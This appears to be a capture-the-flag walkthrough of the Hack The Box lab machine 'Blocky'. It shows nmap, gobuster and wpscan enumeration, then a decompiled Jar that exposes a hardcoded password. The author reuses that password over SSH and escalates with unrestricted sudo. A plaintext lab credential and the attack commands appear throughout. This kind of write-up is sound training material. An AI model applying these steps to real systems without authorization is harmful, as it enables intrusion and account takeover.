---
title: HTB: Blocky
url: https://0xdf.gitlab.io/2020/06/30/htb-blocky.html
date: 2020-06-30T09:00:00+00:00
difficulty: Easy [20]
os: Linux
tags: hackthebox, ctf, htb-blocky, nmap, wordpress, java, jar, decompile, jd-gui, phpmyadmin, wpscan, ssh, sudo, oswe-like, oscp-like-v2
---

![Blocky](https://0xdfimages.gitlab.io/img/blocky-cover.png)

Blocky really was an easy box, but did require some discipline when enumerating. It would be easy to miss the /plugins path that hosts two Java Jar files. From one of those files, I’ll find creds, which as reused by a user on the box, allowing me to get SSH access. To escalate to root, the user is allowed to run any command with sudo and password, which I’ll use to sudo su returning a session as root.

## Box Info

| Name | [Blocky](https://hackthebox.com/machines/blocky)  [Blocky](https://hackthebox.com/machines/blocky) [Play on HackTheBox](https://hackthebox.com/machines/blocky) |
| --- | --- |
| Release Date | 21 Jul 2017 |
| Retire Date | 09 Dec 2017 |
| OS | Linux Linux |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for Blocky |
| Radar Graph | Radar chart for Blocky |
| First Blood User | 00:33:23[echthros echthros](https://app.hackthebox.com/users/2846) |
| First Blood Root | 00:35:15[echthros echthros](https://app.hackthebox.com/users/2846) |
| Creator | [Arrexel Arrexel](https://app.hackthebox.com/users/2904) |

## Recon

### nmap

`nmap` found three open TCP ports, FTP (21), SSH (22) and HTTP (80):

```

root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.37
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-26 15:11 EDT
Nmap scan report for 10.10.10.37
Host is up (0.073s latency).
Not shown: 65531 filtered ports
PORT      STATE  SERVICE
21/tcp    open   ftp
22/tcp    open   ssh
80/tcp    open   http
25565/tcp closed minecraft

Nmap done: 1 IP address (1 host up) scanned in 14.00 seconds

root@kali# nmap -p 21,22,80 -sC -sV -oA scans/nmap-tcpscripts 10.10.10.37
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-26 15:13 EDT
Nmap scan report for 10.10.10.37
Host is up (0.015s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5a
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)
|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)
|_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.8
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: BlockyCraft &#8211; Under Construction!
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.22 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, the host is likely running Ubuntu 16.04 Xenial. There’s also something interesting going on with TCP 25565, as it’s reporting closed. I’ll check that out later.

### FTP - TCP 21

FTP ends up being a bit of a dead end. There are two paths I looked at:
- Anonymous login - typically `nmap` is good at identifying this, but I tried just in case, and it failed.
- Exploits - `nmap` identified this as ProFTPD 1.3.5a. Neither `searchsploit` nor Googling turned up any vulnerabilities in this version that I can exploit without auth. There is a [file copy vulnerability](https://www.exploit-db.com/exploits/36742) in 1.3.5, which might apply here. I’ll come back if I find valid creds.

### Website - TCP 80

#### Site

The site is a MinCraft blog page that is “under construction”.

![image-20200626152945290](https://0xdfimages.gitlab.io/img/image-20200626152945290.png)

If the theme and feel didn’t give it away, at the bottom of the page it says it’s WordPress:

![image-20200626153028554](https://0xdfimages.gitlab.io/img/image-20200626153028554.png)

Going into the only post, I can see the user who posted it is named notch, which I’ll note for later:

![image-20200626154837527](https://0xdfimages.gitlab.io/img/image-20200626154837527.png)

#### Directory Brute Force

I’ll run `gobuster` against the site, and include `-x php` since I know the site is PHP:

```

root@kali# gobuster dir -u http://10.10.10.37 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 40 -o scans/gob
uster-root-medium
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.37
[+] Threads:        40
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2020/06/26 15:34:53 Starting gobuster
===============================================================
/wiki (Status: 301)
/wp-content (Status: 301)
/wp-login.php (Status: 200)
/plugins (Status: 301)
/wp-includes (Status: 301)
/index.php (Status: 301)
/javascript (Status: 301)
/wp-trackback.php (Status: 200)
/wp-admin (Status: 301)
/phpmyadmin (Status: 301)
/wp-signup.php (Status: 302)
/server-status (Status: 403)
===============================================================
2020/06/26 15:38:17 Finished
===============================================================

```

From that list, I’ll check out `/wiki`, `/plugins`, and `/phpmyadmin`. I’ll also want to run `wpscan` to explore the WordPress specific stuff.

#### /wiki

This page is just text saying it doesn’t exist, and that it will come once the main server plugin is done, and then some description of the plugin:

![image-20200626153712976](https://0xdfimages.gitlab.io/img/image-20200626153712976.png)

#### /phpmyadmin

This is a normal looking phpMyAdmin login:

![image-20200626153753146](https://0xdfimages.gitlab.io/img/image-20200626153753146.png)

I’ll check back if I find creds.

#### wpscan

I ran `wpscan` here:

```

root@kali# wpscan --url http://10.10.10.37 -e ap,t,tt,u | tee scans/wpscan 
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.2
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.10.37/ [10.10.10.37]

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.10.37/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] http://10.10.10.37/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://10.10.10.37/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.10.37/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.8 identified (Insecure, released on 2017-06-08).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.10.10.37/index.php/feed/, <generator>https://wordpress.org/?v=4.8</generator>
 |  - http://10.10.10.37/index.php/comments/feed/, <generator>https://wordpress.org/?v=4.8</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://10.10.10.37/wp-content/themes/twentyseventeen/
 | Last Updated: 2020-03-31T00:00:00.000Z
 | Readme: http://10.10.10.37/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 2.3
 | Style URL: http://10.10.10.37/wp-content/themes/twentyseventeen/style.css?ver=4.8
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.10.37/wp-content/themes/twentyseventeen/style.css?ver=4.8, Match: 'Version: 1.3'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Most Popular Themes (via Passive and Aggressive Methods)

 Checking Known Locations -: |==============================================================================================================================================================================================================================================|
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] Theme(s) Identified:

[+] twentyfifteen
 | Location: http://10.10.10.37/wp-content/themes/twentyfifteen/
 | Last Updated: 2020-03-31T00:00:00.000Z
 | Readme: http://10.10.10.37/wp-content/themes/twentyfifteen/readme.txt
 | [!] The version is out of date, the latest version is 2.6
 | Style URL: http://10.10.10.37/wp-content/themes/twentyfifteen/style.css
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen/
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.10.10.37/wp-content/themes/twentyfifteen/, status: 500
 |
 | Version: 1.8 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.10.37/wp-content/themes/twentyfifteen/style.css, Match: 'Version: 1.8'

[+] twentyseventeen
 | Location: http://10.10.10.37/wp-content/themes/twentyseventeen/
 | Last Updated: 2020-03-31T00:00:00.000Z
 | Readme: http://10.10.10.37/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 2.3
 | Style URL: http://10.10.10.37/wp-content/themes/twentyseventeen/style.css
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Known Locations (Aggressive Detection)
 |  - http://10.10.10.37/wp-content/themes/twentyseventeen/, status: 500
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.10.37/wp-content/themes/twentyseventeen/style.css, Match: 'Version: 1.3'

[+] twentysixteen
 | Location: http://10.10.10.37/wp-content/themes/twentysixteen/
 | Last Updated: 2020-03-31T00:00:00.000Z
 | Readme: http://10.10.10.37/wp-content/themes/twentysixteen/readme.txt
 | [!] The version is out of date, the latest version is 2.1
 | Style URL: http://10.10.10.37/wp-content/themes/twentysixteen/style.css
 | Style Name: Twenty Sixteen
 | Style URI: https://wordpress.org/themes/twentysixteen/
 | Description: Twenty Sixteen is a modernized take on an ever-popular WordPress layout — the horizontal masthead ...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.10.10.37/wp-content/themes/twentysixteen/, status: 500
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.10.37/wp-content/themes/twentysixteen/style.css, Match: 'Version: 1.3'

[+] Enumerating Timthumbs (via Passive and Aggressive Methods)

 Checking Known Locations -: |==============================================================================================================================================================================================================================================|

[i] No Timthumbs Found.

[+] Enumerating Users (via Passive and Aggressive Methods)

 Brute Forcing Author IDs -: |==============================================================================================================================================================================================================================================|

[i] User(s) Identified:

[+] notch
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://10.10.10.37/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] Notch
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up

[+] Requests Done: 2989
[+] Cached Requests: 66
[+] Data Sent: 742.701 KB
[+] Data Received: 418.53 KB
[+] Memory used: 227.039 MB
[+] Elapsed time: 00:00:13

```

Strangely, there are no plugins found. It does identify the notch user I noted earlier on the site.

#### /plugins

It would be easy to skip this as a WordPress directory, but visiting this page shows a title of “Cute file browser” and it’s actually hosting two Java Jar files:

![image-20200626154102929](https://0xdfimages.gitlab.io/img/image-20200626154102929.png)

I’ll download both of them.

## Shell as notch

### Reverse Jars

I’ll open each Jar in `jd-gui` (can be installed with `apt install jd-gui`). First I looked at `BlockCore.jar`. It’s super simple, just has a single class with a handful of empty functions. It also has some creds for SQL:

![image-20200626162015610](https://0xdfimages.gitlab.io/img/image-20200626162015610.png)

I can check out the other Jar, but it has a lot of classes:

![image-20200626162131442](https://0xdfimages.gitlab.io/img/image-20200626162131442.png)

I was wondering if this was custom code for HTB, or if it was something that was publicly available. I took an MD5 of the Jar and Googled for it. There’s only one result (as close to a [Googlewhack](https://en.wikipedia.org/wiki/Googlewhack) as I’ll ever get):

![image-20200626162324296](https://0xdfimages.gitlab.io/img/image-20200626162324296.png)

It’s for a plugin from MincraftForge called GriefPrevention, which matches the name on disk. That’s enough for me to think this isn’t important for now. I could look for vulnerabilities in this plugin, but for an easy box, this is likely not the path.

### SSH

I’ve now got two user names (notch and root) and a password (8YsqfCTnvxAUeduzjNSXe22). I’m going to try them on all the services I’ve identified so far, but they work on the first one I try, SSH:

```

root@kali# sshpass -p 8YsqfCTnvxAUeduzjNSXe22 ssh notch@10.10.10.37
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

7 packages can be updated.
7 updates are security updates.

Last login: Tue Jul 25 11:14:53 2017 from 10.10.14.230
notch@Blocky:~$ 

```

And I can grab `user.txt`:

```

notch@Blocky:~$ cat user.txt
59fee097************************

```

For other services, I tried:

| Service | Result | Access | Next Step |
| --- | --- | --- | --- |
| FTP | Success as notch | notch home directory (including `user.txt`) | Can upload SSH key and get shell as notch. |
| /wp-admin | Fail as both | None | N/A |
| phpMyAdmin | Success as root | Databases, including Wordpress | Can change the keys, get WP admin access, and make webshell, which gives www-data access |

## Priv: notch –> root

This may be the easiest root I’ve seen on HTB. `sudo -l` asks for a password, but I have it:

```

notch@Blocky:~$ sudo -l
[sudo] password for notch: 
Matching Defaults entries for notch on Blocky:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User notch may run the following commands on Blocky:
    (ALL : ALL) ALL

```

I can run anything with `sudo` as notch. So I’ll chose `bash` and I’m root:

```

notch@Blocky:~$ sudo su - 
root@Blocky:~#

```

I’ll grab `root.txt`:

```

root@Blocky:~# cat root.txt
0a9694a5************************

```

I suspect there are kernel exploits I could use here as well, but I’ll leave that as an exercise for the reader.